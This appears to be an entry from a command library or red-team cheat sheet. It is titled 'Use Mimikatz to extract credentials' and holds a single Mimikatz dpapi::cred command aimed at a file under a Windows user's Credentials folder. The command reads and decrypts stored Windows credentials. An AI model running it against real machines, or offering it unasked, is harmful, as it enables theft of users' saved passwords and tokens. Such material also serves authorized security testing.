---
id: ef591aea-06e8-42b1-869a-5531605889e1
name: Use Mimikatz to extract credentials
type: command
executor: bash
data: $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
output: null
created_at: '2023-04-06T03:56:27.473499+00:00'
updated_at: '2023-04-10T20:37:18.798330+00:00'
---

# Use Mimikatz to extract credentials

```bash
$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
```
